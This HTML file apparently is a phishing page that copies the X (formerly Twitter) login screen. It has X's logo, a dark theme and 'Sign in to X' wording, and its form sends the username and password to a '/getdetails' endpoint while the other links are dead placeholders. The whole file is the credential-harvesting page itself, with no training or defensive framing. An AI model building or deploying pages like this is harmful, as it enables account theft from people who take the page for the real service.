<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login on X</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000; /* Dark theme */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff; /* White text */
        }
        .container {
            width: 350px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 50px;
        }
        .title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            border: 1px solid #333;
            border-radius: 5px;
            background: #000;
            color: #fff;
        }
        .form-group input:focus {
            outline: none;
            border-color: #1da1f2;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            background-color: #1da1f2; /* X blue */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #1481c8;
        }
        .forgot-password {
            display: block;
            margin-top: 15px;
            font-size: 0.9rem;
            color: #1da1f2;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 20px;
            font-size: 0.9rem;
        }
        .signup a {
            color: #1da1f2;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/X_logo_2023.svg" alt="X Logo">
        </div>
        <div class="title">Sign in to X</div>
        <form action="/getdetails" method="post">
            <div class="form-group">
                <input type="text" placeholder="Phone, email, or username" name="username" required>
            </div>
            <div class="form-group">
                <input type="password" placeholder="Password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
